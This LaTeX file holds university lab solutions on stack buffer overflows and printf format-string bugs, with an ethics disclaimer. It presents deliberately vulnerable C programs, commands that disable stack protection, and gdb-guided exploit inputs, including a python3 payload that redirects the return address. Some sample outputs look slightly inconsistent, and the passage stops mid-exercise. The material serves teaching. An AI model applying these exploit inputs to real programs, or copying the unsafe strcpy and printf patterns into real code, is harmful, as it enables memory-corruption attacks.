\documentclass[a4paper,11pt]{article}

\usepackage{fullpage}
\usepackage[utf8]{inputenc}
\usepackage[T1]{fontenc}
\usepackage{amsmath,amsthm}
\usepackage{amsfonts}
\usepackage{graphicx}
\usepackage{latexsym}
\usepackage{float}
\usepackage{comment}
\usepackage{array}
\usepackage{booktabs}

% --- Packages added for pedagogical enrichment ---
\usepackage{xcolor}
\usepackage{listings}
\usepackage[most]{tcolorbox}
\usepackage{hyperref}

%%%%%%%%%%%%%%% LISTINGS CONFIGURATION %%%%%%%%%%%%%%%%%%%

\definecolor{codegreen}{rgb}{0.25,0.49,0.25}
\definecolor{codegray}{rgb}{0.5,0.5,0.5}
\definecolor{codepurple}{rgb}{0.58,0,0.82}
\definecolor{codered}{rgb}{0.7,0.1,0.1}
\definecolor{codeblue}{rgb}{0.0,0.0,0.7}
\definecolor{backcolour}{rgb}{0.97,0.97,0.97}

\lstset{
    language=C,
    backgroundcolor=\color{backcolour},
    commentstyle=\color{codegreen}\itshape,
    keywordstyle=\color{codeblue}\bfseries,
    stringstyle=\color{codered},
    basicstyle=\ttfamily\small,
    breakatwhitespace=false,
    breaklines=true,
    captionpos=b,
    keepspaces=true,
    numbers=left,
    numbersep=8pt,
    numberstyle=\tiny\color{codegray},
    showspaces=false,
    showstringspaces=false,
    showtabs=false,
    tabsize=4,
    frame=single,
    rulecolor=\color{codegray},
    xleftmargin=1.5em,
    framexleftmargin=1.5em,
    literate={é}{{\'e}}1 {è}{{\`e}}1 {ê}{{\^e}}1 {à}{{\`a}}1 {ù}{{\`u}}1 {î}{{\^i}}1 {ô}{{\^o}}1
}

%%%%%%%%%%%%%%% TCOLORBOX ENVIRONMENTS %%%%%%%%%%%%%%%%%%

% Course reminder (light blue background)
\newtcolorbox{rappel}[1][]{
    colback=blue!5!white,
    colframe=blue!50!black,
    fonttitle=\bfseries,
    title={\large Course Reminder},
    #1
}

% Key takeaway (light green background)
\newtcolorbox{pointcle}[1][]{
    colback=green!5!white,
    colframe=green!40!black,
    fonttitle=\bfseries,
    title={Key Takeaway},
    #1
}

% Warning (light orange background)
\newtcolorbox{attention}[1][]{
    colback=orange!8!white,
    colframe=orange!60!black,
    fonttitle=\bfseries,
    title={Warning},
    #1
}

% Ethical disclaimer (red background)
\newtcolorbox{ethique}[1][]{
    colback=red!5!white,
    colframe=red!60!black,
    fonttitle=\bfseries\large,
    title={Ethical and Legal Disclaimer},
    #1
}

%%%%%%%%%%%%%%% COMMANDS %%%%%%%%%%%%%%%%%%%%%%%%%%%

\newcommand{\itemb}{\item[$\bullet$]}
\newcommand{\Fd}{\mathbb{F}}
\newcommand{\Znat}{\mathbb{Z}}
\newcommand{\Nnat}{\mathbb{N}}

%%%%%%%%%%%%%%% ENVIRONMENTS %%%%%%%%%%%%%%%%%%%%%%%

\theoremstyle{plain}
\newtheorem{lemme}{Lemma}
\newtheorem{algorithme}{Algorithm}
\newtheorem{corolaire}{Corollary}
\newtheorem{propriete}{Property}
\newtheorem{proposition}{Proposition}
\newtheorem{theoreme}{Theorem}
\newtheorem{definition}{Definition}
\newtheorem{correction}{Answer}

\theoremstyle{definition}
\newtheorem{exercice}{Exercise}
\newtheorem{remarque}{Remark}
\newtheorem{exemple}{Example}

\hypersetup{
    colorlinks=true,
    linkcolor=blue!60!black,
    urlcolor=blue!60!black
}

%%%%%%%%%%%%%% DOCUMENT %%%%%%%%%%%%%%%%%%%%%%%%%%%%


\begin{document}

\hbox{\raisebox{0.4em}{\vrule depth 0pt height 0.5pt width \textwidth}}
\noindent \textbf{University of Perpignan} \hfill  L3 Computer Science \\
 \hfill C. Legrand \hfill  Year \the\year \\
\smallskip
\begin{center}
{
  {\scshape \large Lab Work 5 -- Security -- Solutions}  \\
 Intrusion Techniques -- Buffer Overflow
}
\end{center}
\hbox{\raisebox{0.4em}{\vrule depth 0pt height 0.9pt width \textwidth}}

\bigskip

% --- Ethical disclaimer ---
\begin{ethique}
The techniques presented in this lab work are studied within a \textbf{strictly academic context} in order to understand the mechanisms used by attackers and thus be better able to defend against them.

\textbf{Any use of these techniques outside the educational context is illegal} and punishable by criminal penalties (Chapter III of the French Penal Code, Articles 323-1 to 323-8 -- \textit{Offences against Automated Data Processing Systems}):
\begin{itemize}
    \item Unauthorized access to or remaining in an ADPS (Art.~323-1): \textbf{3 years} imprisonment and \textbf{\texteuro{}100,000} fine
    \item Obstructing the operation of an ADPS (Art.~323-2): \textbf{5 years} imprisonment and \textbf{\texteuro{}150,000} fine
    \item Fraudulent introduction of data into an ADPS (Art.~323-3): \textbf{5 years} imprisonment and \textbf{\texteuro{}150,000} fine
\end{itemize}
Penalties increased to \textbf{7 years} and \textbf{\texteuro{}300,000} when the targeted system processes personal data operated by the State, and up to \textbf{10 years} and \textbf{\texteuro{}300,000} for organized crime (Art.~323-4-1). \textit{Penalties updated by the LOPMI law no.~2023-22 of January 24, 2023.}
\end{ethique}

\bigskip

\begin{tcolorbox}[colback=gray!5!white, colframe=gray!60!black, title={Compilation Options}]
The following options should be used when you want to overflow the stack (\texttt{-fno-stack-protector}) and know the code addresses (\texttt{-no-pie}) which are no longer randomized:
\begin{lstlisting}[language=bash,numbers=none]
gcc -fno-stack-protector -no-pie -g code.c
\end{lstlisting}
One last option that we will not use here: if you wish to execute code injected onto the stack (\texttt{-z execstack}).
\end{tcolorbox}

\medskip

\begin{rappel}
\textbf{Stack organization:} when calling a function, the processor pushes:
\begin{enumerate}
    \item The function parameters (partly via registers on x86-64)
    \item The return address \texttt{savedRIP} (pushed by \texttt{call})
    \item The old \texttt{RBP} (\texttt{savedRBP}) saved by \texttt{push rbp}
    \item The function's local variables
\end{enumerate}
The \texttt{RSP} register points to the top of the stack; \texttt{RBP} points to the base of the current stack frame.

\medskip
\textbf{Stack layout (high to low addresses):}
\begin{lstlisting}[numbers=none,frame=none,backgroundcolor=\color{white}]
High addresses
+---------------------------+
| Function parameters       |  (partly in registers on x86-64)
+---------------------------+
| savedRIP (return address) |  <-- rbp + 8
+---------------------------+
| savedRBP (old rbp)        |  <-- rbp
+---------------------------+
| Local variable 1          |  <-- rbp - 8
+---------------------------+
| Local variable 2          |  <-- rbp - 16
+---------------------------+
| ...                       |
+---------------------------+
Low addresses (RSP points here)
\end{lstlisting}
\end{rappel}

\bigskip


%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%% EXERCISE 1: Buffer Overflow
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

\begin{exercice}[Buffer Overflow]
\begin{enumerate}
\item
Consider the following program:
\begin{lstlisting}[language=C]
#include <stdio.h>
#include <string.h>

int main(int argc, char *argv[]){
  int valeur=5;
  char tampon_un[8], tampon_deux[8];

  strcpy(tampon_un,"un");
  strcpy(tampon_deux,"deux");

  printf("[AVANT] tampon_deux est a %p et contient '%s'\n",
         tampon_deux, tampon_deux);
  printf("[AVANT] tampon_un est a %p et contient '%s'\n",
         tampon_un, tampon_un);
  printf("[AVANT] valeur est a %p et vaut %d (0x%08x)\n",
         &valeur, valeur, valeur);

  printf("\n [STRCPY] copie de %d octets dans tampon_deux\n\n",
         (int)strlen(argv[1]));
  strcpy(tampon_deux, argv[1]);

  printf("[APRES] tampon_deux est a %p et contient '%s'\n",
         tampon_deux, tampon_deux);
  printf("[APRES] tampon_un est a %p et contient '%s'\n",
         tampon_un, tampon_un);
  printf("[APRES] valeur est a %p et vaut %d (0x%08x)\n",
         &valeur, valeur, valeur);

  return(0);
}
\end{lstlisting}

By varying the argument, trigger a buffer overflow and analyze it with \texttt{gdb}.

\begin{pointcle}
The \texttt{strcpy} function does \textbf{NOT} check the destination buffer size. If the source is longer than the buffer, surplus bytes overwrite adjacent data on the stack.
\end{pointcle}

\item Consider the following code fragment that restricts access rights:

\begin{lstlisting}[language=C]
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int verif_authentication(char *password){
  int auth_flag = 0;
  char password_tampon[16];

  strcpy(password_tampon, password);

  if( strcmp(password_tampon, "brillig") == 0)
    auth_flag = 1;
  if(strcmp(password_tampon, "outgrabe") == 0)
    auth_flag = 1;

  return auth_flag;
}

int main( int argc, char *argv[]){
  if(argc < 2){
    printf("Usage: %s <password>\n", argv[0]);
    exit(0);
  }

  if(verif_authentication(argv[1])){
    printf("\n-=-=-=-=-=-=-=-=-=-=--=-=-\n");
    printf("      Acces accorde.\n");
    printf("-=-=-=-=-=-=-=-=-=-=--=-=-\n");
  }
  else
    printf("     Acces refuse\n");
}
\end{lstlisting}
Is it possible to perform a buffer overflow to force access (\texttt{auth\_flag} $\neq 0$)? What happens if the variables are declared in the following order:
\begin{lstlisting}[language=C,numbers=none]
  char password_tampon[16];
  int auth_flag = 0;
\end{lstlisting}
Can you still work around this issue to display \texttt{Acces accorde} via buffer overflow? Explain in detail why it works.
\end{enumerate}
\end{exercice}

\begin{correction}

\begin{enumerate}
\item \textbf{Overflow analysis with gdb:}

\medskip
\textbf{Step 1: Compile with protections disabled.}
\begin{lstlisting}[language=bash,numbers=none]
$ gcc -fno-stack-protector -no-pie -g code-exo1-q1-debordement-simple.c
\end{lstlisting}

\textbf{Step 2: Run with a short argument (no overflow).}
\begin{lstlisting}[language=bash,numbers=none]
$ ./a.out AAAA
[AVANT] tampon_deux est a 0x7fffffffde10 et contient 'deux'
[AVANT] tampon_un est a 0x7fffffffde18 et contient 'un'
[AVANT] valeur est a 0x7fffffffde24 et vaut 5 (0x00000005)

 [STRCPY] copie de 4 octets dans tampon_deux

[APRES] tampon_deux est a 0x7fffffffde10 et contient 'AAAA'
[APRES] tampon_un est a 0x7fffffffde18 et contient 'un'
[APRES] valeur est a 0x7fffffffde24 et vaut 5 (0x00000005)
\end{lstlisting}

Everything is normal: \texttt{tampon\_deux} is at a lower address than \texttt{tampon\_un}, which is lower than \texttt{valeur}. The arrays are adjacent on the stack.

\medskip
\textbf{Step 3: Run with 8 bytes (exact overflow into tampon\_un).}
\begin{lstlisting}[language=bash,numbers=none]
$ ./a.out AAAAAAAABBBB
[APRES] tampon_deux est a 0x7fffffffde10 et contient 'AAAAAAAABBBB'
[APRES] tampon_un est a 0x7fffffffde18 et contient 'BBBB'
[APRES] valeur est a 0x7fffffffde24 et vaut 5 (0x00000005)
\end{lstlisting}

The 8 'A' bytes fill \texttt{tampon\_deux} (8 bytes), then the 'B' bytes overflow into \texttt{tampon\_un}. Notice that \texttt{tampon\_un} now contains \texttt{"BBBB"} instead of \texttt{"un"}.

\medskip
\textbf{Step 4: Run with enough bytes to reach valeur.}
\begin{lstlisting}[language=bash,numbers=none]
$ ./a.out AAAAAAAABBBBBBBBCCCCCCCC
[APRES] tampon_deux est a 0x7fffffffde10 et contient 'AAAAAAAABBBBBBBBCCCCCCCC'
[APRES] tampon_un est a 0x7fffffffde18 et contient 'BBBBBBBBCCCCCCCC'
[APRES] valeur est a 0x7fffffffde24 et vaut 1128481603 (0x43434343)
\end{lstlisting}

The variable \texttt{valeur} now contains \texttt{0x43434343} (the ASCII code for 'C' is \texttt{0x43}). The overflow has \textbf{overwritten the integer variable} with our chosen bytes.

\medskip
\textbf{GDB analysis:}
\begin{lstlisting}[language=bash,numbers=none]
$ gdb ./a.out
(gdb) break main
(gdb) run AAAAAAAABBBBBBBBCCCC
(gdb) info locals
valeur = 5
(gdb) x/40bx tampon_deux
\end{lstlisting}

In GDB, \texttt{x/40bx} displays 40 bytes starting from \texttt{tampon\_deux}. You can observe the adjacent memory layout: \texttt{tampon\_deux} (8 bytes) $\rightarrow$ \texttt{tampon\_un} (8 bytes) $\rightarrow$ padding $\rightarrow$ \texttt{valeur} (4 bytes).

\medskip
\textbf{Explanation:} The variables are stored adjacently on the stack in decreasing address order. Since \texttt{strcpy} does not check bounds, writing beyond \texttt{tampon\_deux}'s 8 bytes continues into the memory occupied by \texttt{tampon\_un} and then \texttt{valeur}.

\begin{attention}
The exact memory layout depends on the compiler and optimization level. Always use \texttt{gdb} to verify the actual addresses and offsets on your system. The compiler may add padding between variables for alignment purposes.
\end{attention}

\item \textbf{Authentication bypass:}

\medskip
\textbf{Case 1: \texttt{auth\_flag} declared BEFORE \texttt{password\_tampon} (original code).}

In the original code:
\begin{lstlisting}[language=C,numbers=none]
  int auth_flag = 0;
  char password_tampon[16];
\end{lstlisting}

On the stack, \texttt{password\_tampon} is at a \textbf{lower} address than \texttt{auth\_flag} (the stack grows downward, so variables declared later are at lower addresses). When we overflow \texttt{password\_tampon}, we write toward \textbf{higher} addresses, i.e., toward \texttt{auth\_flag}.

\begin{lstlisting}[language=bash,numbers=none]
$ ./a.out AAAAAAAAAAAAAAAAAAAAAAAAA
-=-=-=-=-=-=-=-=-=-=--=-=-
      Acces accorde.
-=-=-=-=-=-=-=-=-=-=--=-=-
\end{lstlisting}

By providing more than 16 characters, the overflow of \texttt{password\_tampon} overwrites \texttt{auth\_flag} with non-zero bytes (the 'A' characters). Since any non-zero value of \texttt{auth\_flag} is interpreted as true, access is granted.

\medskip
\textbf{Stack layout (Case 1):}
\begin{lstlisting}[numbers=none,frame=none,backgroundcolor=\color{white}]
High addresses
+---------------------------+
| savedRIP                  |  <-- rbp + 8
+---------------------------+
| savedRBP                  |  <-- rbp
+---------------------------+
| auth_flag (4 bytes)       |  <-- rbp - 4   (overwritten!)
+---------------------------+
| padding (alignment)       |
+---------------------------+
| password_tampon[16]       |  <-- rbp - 0x20 (overflow starts here)
+---------------------------+
Low addresses
\end{lstlisting}

\medskip
\textbf{Case 2: \texttt{password\_tampon} declared BEFORE \texttt{auth\_flag} (reversed order).}

\begin{lstlisting}[language=C,numbers=none]
  char password_tampon[16];
  int auth_flag = 0;
\end{lstlisting}

Now \texttt{auth\_flag} is at a \textbf{lower} address than \texttt{password\_tampon}. Overflowing \texttt{password\_tampon} writes toward higher addresses, away from \texttt{auth\_flag}. We \textbf{cannot} directly overwrite \texttt{auth\_flag} this way.

\medskip
\textbf{However, we can still bypass the authentication!} The overflow continues past \texttt{auth\_flag}'s location and reaches \texttt{savedRBP} and then \texttt{savedRIP} (the return address). By carefully crafting the input, we can overwrite \texttt{savedRIP} to redirect execution to the code that prints \texttt{"Acces accorde"}, skipping the conditional check entirely.

\begin{lstlisting}[language=bash,numbers=none]
# Find the address of the "Acces accorde" printf block using gdb:
$ gdb ./a.out
(gdb) disas main
# Identify the address of the instruction after the conditional jump
# that leads to the "Acces accorde" printf calls.
# Then craft the payload to overwrite savedRIP with that address.
\end{lstlisting}

\textbf{Why it works:} Even when we cannot directly overwrite the target variable, we can always overwrite \texttt{savedRIP} (the return address) which is always at a higher address than local variables. This allows us to redirect execution anywhere in the program.

\end{enumerate}

\begin{pointcle}
The \texttt{strcpy} function does \textbf{NOT} check the destination buffer size. If the source is longer, surplus bytes overwrite adjacent data on the stack. Even if the variable layout prevents direct overwrite of a target variable, the attacker can always reach \texttt{savedRIP} to redirect the execution flow.
\end{pointcle}

\end{correction}

\bigskip


%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%% EXERCISE 2: Return Address Modification (Increment)
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

\begin{exercice}[Modifying the Return Address on the Stack]
Using the code from the lecture (given below), adjust the values of $a$ and $b$ in order to execute, upon function return:
\begin{itemize}
\item Directly the end of the \texttt{main} function (thus skipping both \texttt{printf("coucou1")} and \texttt{printf("coucou2")}).
  \item What will happen if we return to the instruction \texttt{b=15}?
\end{itemize}

\begin{lstlisting}[language=C]
#include <stdio.h>

void function(long a, long b)
{
  long buffer[2]={0,1};
  buffer[a]+=b;
}
void main()
{
  long a,b;
  a=1;
  b=15;
  function(a,b);
  printf("coucou1\n");
  printf("coucou2\n");
}
\end{lstlisting}

\begin{rappel}
To find the correct values of \texttt{a} and \texttt{b}, you must:
\begin{enumerate}
    \item Analyze the assembly code with \texttt{gdb} to determine the size of \texttt{function}'s stack frame
    \item Calculate the offset between \texttt{buffer[0]} and \texttt{savedRIP}
    \item Determine the increment needed to jump past the desired instructions
\end{enumerate}
\end{rappel}
\end{exercice}

\begin{correction}

\textbf{Step 1: Analyze the stack frame of \texttt{function} with gdb.}

\begin{lstlisting}[language=bash,numbers=none]
$ gcc -fno-stack-protector -no-pie -g code-exo2-modif-adresse-retour.c
$ gdb ./a.out
(gdb) disas function
\end{lstlisting}

Typical disassembly of \texttt{function}:
\begin{lstlisting}[language=bash,numbers=none]
Dump of assembler code for function:
   push   rbp
   mov    rbp,rsp
   mov    QWORD PTR [rbp-0x28],rdi       # parameter a
   mov    QWORD PTR [rbp-0x30],rsi       # parameter b
   mov    QWORD PTR [rbp-0x10],0x0       # buffer[0] = 0
   mov    QWORD PTR [rbp-0x8],0x1        # buffer[1] = 1
   ...
   buffer[a] += b
   ...
   leave
   ret
\end{lstlisting}

From the disassembly, we can determine:
\begin{itemize}
\item \texttt{buffer[0]} is at \texttt{rbp - 0x10} (i.e., \texttt{rbp - 16})
\item \texttt{buffer[1]} is at \texttt{rbp - 0x8} (i.e., \texttt{rbp - 8})
\item \texttt{savedRBP} is at \texttt{rbp + 0} (8 bytes)
\item \texttt{savedRIP} is at \texttt{rbp + 0x8} (i.e., \texttt{rbp + 8})
\end{itemize}

\medskip
\textbf{Step 2: Calculate the value of \texttt{a}.}

Each element of \texttt{buffer} is a \texttt{long} (8 bytes on x86-64). The instruction \texttt{buffer[a] += b} accesses address \texttt{buffer + a * 8}.

We need: \texttt{buffer + a * 8 = savedRIP}

\begin{itemize}
\item \texttt{buffer[0]} is at \texttt{rbp - 16}
\item \texttt{savedRIP} is at \texttt{rbp + 8}
\item Offset = (\texttt{rbp + 8}) - (\texttt{rbp - 16}) = 24 bytes = 3 longs
\end{itemize}

Therefore: $\boxed{a = 3}$

\medskip
\textbf{Step 3: Calculate the value of \texttt{b} (skip both printf calls).}

\begin{lstlisting}[language=bash,numbers=none]
(gdb) disas main
Dump of assembler code for main:
   ...
   call   function                    # address X
   lea    rdi,[rip+...]   # "coucou1\n"   <-- savedRIP points here (X+5)
   call   printf
   lea    rdi,[rip+...]   # "coucou2\n"
   call   printf
   nop                                # <-- we want to jump here
   leave
   ret
\end{lstlisting}

The value of \texttt{b} is the number of bytes to add to \texttt{savedRIP} to skip past both \texttt{printf} calls. This depends on the exact encoding of the instructions.

Typically, each \texttt{lea + call printf} block takes about 12--15 bytes. You need to read the exact addresses from the disassembly:

\begin{lstlisting}[language=bash,numbers=none]
(gdb) disas main
   0x00000000004011a0 <+35>:  call   0x401156 <function>
   0x00000000004011a5 <+40>:  lea    rdi,[rip+0xe5c]   # "coucou1"
   0x00000000004011ac <+47>:  call   0x401030 <puts@plt>
   0x00000000004011b1 <+52>:  lea    rdi,[rip+0xe52]   # "coucou2"
   0x00000000004011b8 <+59>:  call   0x401030 <puts@plt>
   0x00000000004011bd <+64>:  nop
   0x00000000004011be <+65>:  leave
   0x00000000004011bf <+66>:  ret
\end{lstlisting}

In this example:
\begin{itemize}
\item \texttt{savedRIP} = \texttt{0x4011a5} (instruction after \texttt{call function})
\item Target (skip both printf) = \texttt{0x4011bd} (the \texttt{nop} before \texttt{leave})
\item $b$ = \texttt{0x4011bd} - \texttt{0x4011a5} = \texttt{0x18} = 24
\end{itemize}

\begin{attention}
The exact value of $b$ depends on your specific compilation. You \textbf{must} use \texttt{gdb} to read the actual addresses. The compiler may generate \texttt{puts} instead of \texttt{printf} when the format string has no format specifiers (just a string ending with \texttt{\textbackslash n}).
\end{attention}

\medskip
\textbf{Final code:}
\begin{lstlisting}[language=C]
void main()
{
  long a,b;
  a=3;     // offset to reach savedRIP (3 longs = 24 bytes)
  b=24;    // increment to skip both printf calls (adjust per your disas)
  function(a,b);
  printf("coucou1\n");  // skipped!
  printf("coucou2\n");  // skipped!
}
\end{lstlisting}

\begin{lstlisting}[language=bash,numbers=none]
$ ./a.out
$                     # No output: both printf calls were skipped
\end{lstlisting}

\medskip
\textbf{Step 4: What happens if we return to \texttt{b=15}?}

If the value of $b$ is calculated so that \texttt{savedRIP} points to the instruction \texttt{b=15} in \texttt{main} (which is \textbf{before} the \texttt{call function} instruction), then upon return from \texttt{function}:
\begin{enumerate}
\item Execution jumps to \texttt{b=15}
\item Then \texttt{function(a,b)} is called again
\item Inside \texttt{function}, \texttt{buffer[a] += b} modifies \texttt{savedRIP} again
\item Upon return, execution jumps back to \texttt{b=15}
\item This repeats indefinitely
\end{enumerate}

This creates an \textbf{infinite loop}. The program never terminates and keeps calling \texttt{function} over and over again. Eventually, the stack may overflow due to repeated calls (if the compiler does not optimize the frame reuse), or the program just loops forever.

\begin{rappel}
\textbf{GDB analysis methodology for return address attacks:}
\begin{enumerate}
    \item Compile with \texttt{-fno-stack-protector -no-pie -g}
    \item Use \texttt{disas function} to find \texttt{buffer}'s position relative to \texttt{rbp}
    \item Use \texttt{disas main} to find the exact addresses of instructions to skip
    \item Calculate $a$ = (distance from \texttt{buffer[0]} to \texttt{savedRIP}) / \texttt{sizeof(long)}
    \item Calculate $b$ = (target address) - (normal return address)
    \item Set breakpoints and use \texttt{x/xg \$rbp+8} to verify \texttt{savedRIP}
    \item Use \texttt{stepi} to single-step through instructions and confirm the redirect
\end{enumerate}
\end{rappel}

\end{correction}

\bigskip


%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%% EXERCISE 3: Return Address Overwrite via Overflow
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

\begin{exercice}[Return Address Overwrite via Overflow]
Consider the following code:
\begin{lstlisting}[language=C]
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void f(char *s)
{
  char nom[10];
  strcpy(nom,s);
  printf("\n");
  printf("%lx\n",*((unsigned long *)(nom+18)));
  printf("Bonjour %s, on est dans f\n",nom);
}

void secret()
{
  printf("on est dans secret\n");
}

int main(int argc, char **argv)
{
  printf("adresse de f=%p, et de secret=%p\n",f,secret);
  f(argv[1]);
}
\end{lstlisting}
By overwriting the return address of the call to function \texttt{f}, make the program execute function \texttt{secret}.

\begin{attention}
To pass a string of characters specified by their ASCII code as a parameter, you can use \texttt{python3} as follows (for the two ASCII codes \texttt{0x11} and \texttt{0xff}):
\begin{lstlisting}[language=bash,numbers=none]
$ python3 -c "print('\x11\xff')"
\end{lstlisting}
\end{attention}
\end{exercice}

\begin{correction}

\textbf{Step 1: Compile and find the addresses.}

\begin{lstlisting}[language=bash,numbers=none]
$ gcc -fno-stack-protector -no-pie -g code-exo3-ecrasement-adresse-retour.c
$ ./a.out test
adresse de f=0x401156, et de secret=0x4011a0

Bonjour test, on est dans f
\end{lstlisting}

The program helpfully prints the addresses of both functions. We need to redirect execution to \texttt{secret} at address \texttt{0x4011a0} (this address varies per compilation; use the one your program prints).

\medskip
\textbf{Step 2: Analyze the stack frame of \texttt{f} with gdb.}

\begin{lstlisting}[language=bash,numbers=none]
$ gdb ./a.out
(gdb) disas f
Dump of assembler code for function f:
   push   rbp
   mov    rbp,rsp
   sub    rsp,0x20
   mov    QWORD PTR [rbp-0x18],rdi    # parameter s
   lea    rax,[rbp-0xa]               # nom starts at rbp-0xa
   ...
\end{lstlisting}

From the disassembly:
\begin{itemize}
\item \texttt{nom} starts at \texttt{rbp - 0xa} (i.e., \texttt{rbp - 10})
\item \texttt{savedRBP} is at \texttt{rbp + 0} (8 bytes)
\item \texttt{savedRIP} is at \texttt{rbp + 8}
\end{itemize}

\medskip
\textbf{Step 3: Calculate the padding.}

Distance from \texttt{nom} to \texttt{savedRIP}:
\begin{itemize}
\item From \texttt{rbp - 10} to \texttt{rbp + 8} = 18 bytes
\end{itemize}

We need:
\begin{itemize}
\item 18 bytes of padding (to fill \texttt{nom} + \texttt{savedRBP})
\item Then the address of \texttt{secret()} in little-endian byte order
\end{itemize}

\begin{attention}
Note that the line \texttt{printf("\%lx\textbackslash n", *((unsigned long *)(nom+18)))} in the source code already reads the 8 bytes at offset 18 from \texttt{nom} -- this is precisely \texttt{savedRIP}! This is a hint from the exercise: it confirms that the return address is 18 bytes from the start of \texttt{nom}.
\end{attention}

\medskip
\textbf{Step 4: Craft the exploit.}

Assuming \texttt{secret} is at \texttt{0x4011a0} (check your own output!), in little-endian: \texttt{\textbackslash xa0\textbackslash x11\textbackslash x40} followed by null bytes (since the upper bytes of the address are 0x00).

\begin{lstlisting}[language=bash,numbers=none]
$ ./a.out $(python3 -c "import sys; sys.stdout.buffer.write(b'a'*18 + b'\xa0\x11\x40\x00\x00\x00\x00\x00')")
adresse de f=0x401156, et de secret=0x4011a0

4011a0
Bonjour aaaaaaaaaaaaaaaaaa@, on est dans f
on est dans secret
\end{lstlisting}

The program prints \texttt{"on est dans secret"}, confirming that execution was successfully redirected to the \texttt{secret()} function.

\medskip
\textbf{Explanation:}
\begin{enumerate}
\item The 18 'a' characters fill the space from \texttt{nom} up to (but not including) \texttt{savedRIP}
\item The next bytes (\texttt{\textbackslash xa0\textbackslash x11\textbackslash x40\textbackslash x00...}) overwrite \texttt{savedRIP} with the address of \texttt{secret()}
\item When \texttt{f()} executes \texttt{ret}, it pops this crafted address into \texttt{RIP}
\item Execution jumps to \texttt{secret()} instead of returning to \texttt{main()}
\end{enumerate}

\begin{lstlisting}[numbers=none,frame=none,backgroundcolor=\color{white}]
Stack of f() after overflow:
+---------------------------+
| savedRIP = 0x4011a0       |  <-- overwritten with secret()'s address!
+---------------------------+
| savedRBP = 0x616161...    |  <-- overwritten with 'a' bytes
+---------------------------+
| nom = "aaaaaaaaaa"        |  <-- 10 bytes of 'a'
+---------------------------+
\end{lstlisting}

\begin{attention}
\begin{itemize}
\item The address must be written in \textbf{little-endian} byte order (least significant byte first), because x86-64 is a little-endian architecture.
\item Using \texttt{python3 -c "print(...)"} may add a trailing newline (\texttt{\textbackslash x0a}). Using \texttt{sys.stdout.buffer.write()} avoids this issue.
\item After \texttt{secret()} finishes, the program will likely crash (segfault) because the stack frame is corrupted. This is expected in a simple exploit.
\item If ASLR is enabled (default on modern Linux), addresses are randomized. The \texttt{-no-pie} flag disables position-independent code to make addresses predictable.
\end{itemize}
\end{attention}

\end{correction}

\bigskip


%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%% EXERCISE 4: printf Format String Exploit
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

\begin{exercice}[Exploiting the \texttt{printf} Format String]
Consider the following code compiled with the options \texttt{-fno-stack-protector -no-pie}:
\begin{lstlisting}[language=C]
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char *argv[]) {
  unsigned long d;
  char texte[512];

  static int test_var = 100*256*256+100*256+100;
  if(argc < 3) {
    printf("Usage: %s <text to print> <entier>\n", argv[0]);
    exit(0);
  }
  d=atoi(argv[2]);

  strcpy(texte, argv[1]);
  printf("La bonne facon d'afficher des entrees utilisateurs:\n");
  printf("%s", texte);
  printf("\nLa mauvaise facon d'afficher des entrees utilisateurs:\n");
  printf(texte);
  printf("\n");
  // Debug output
  printf("[*] test_var @ %p = %lu, %04x\n", &test_var, &test_var, test_var);
  printf("[*] adresse de d=%p, valeur de d=0x%016lx\n", &d, d);
  printf("[*] adresse de texte=%p\n", texte);
  exit(0);
}
\end{lstlisting}

\begin{enumerate}
\item Understand and test the program, then apply what was covered in the lecture to display the contents of \texttt{main}'s stack by choosing the program's argument wisely on the command line.
\item If the program's argument contains the format \texttt{"\%s"}, what will happen? Can you choose the address that \texttt{"\%s"} targets and use it to read the value of \texttt{test\_var}?
\end{enumerate}

\begin{pointcle}
The call \texttt{printf(texte)} is dangerous because the attacker controls the format string. They can use \texttt{\%x}, \texttt{\%lx}, \texttt{\%s} to read memory, and even \texttt{\%n} to write to memory!
\end{pointcle}
\end{exercice}

\begin{correction}

\begin{enumerate}
\item \textbf{Reading the stack with format specifiers:}

\medskip
\textbf{Understanding the vulnerability:}

The program has two calls to \texttt{printf} with user input:
\begin{itemize}
\item \texttt{printf("\%s", texte)} -- \textbf{Safe}: the format string is controlled by the programmer, \texttt{texte} is treated as data.
\item \texttt{printf(texte)} -- \textbf{Dangerous}: the user's input IS the format string. If the user includes format specifiers like \texttt{\%x} or \texttt{\%lx}, \texttt{printf} will consume values from the registers and then from the stack.
\end{itemize}

\medskip
\textbf{Normal usage:}
\begin{lstlisting}[language=bash,numbers=none]
$ ./a.out "Hello World" 42
La bonne facon d'afficher des entrees utilisateurs:
Hello World
La mauvaise facon d'afficher des entrees utilisateurs:
Hello World
[*] test_var @ 0x404030 = 4210116, 00646464
[*] adresse de d=0x7fffffffdd08, valeur de d=0x000000000000002a
[*] adresse de texte=0x7fffffffdb00
\end{lstlisting}

Both outputs are identical. Note that \texttt{test\_var} = $100 \times 256^2 + 100 \times 256 + 100$ = $6553600 + 25600 + 100$ = $6579300$... Actually, let us compute: $100 \times 65536 + 100 \times 256 + 100 = 6553600 + 25600 + 100 = 6579300$. In hex: \texttt{0x646464}.

\medskip
\textbf{Exploiting the format string to read the stack:}
\begin{lstlisting}[language=bash,numbers=none]
$ ./a.out "%08x.%08x.%08x.%08x.%08x.%08x" 42
La bonne facon d'afficher des entrees utilisateurs:
%08x.%08x.%08x.%08x.%08x.%08x
La mauvaise facon d'afficher des entrees utilisateurs:
ffffe1b8.00000000.00000000.78383025.3830252e.30252e78
\end{lstlisting}

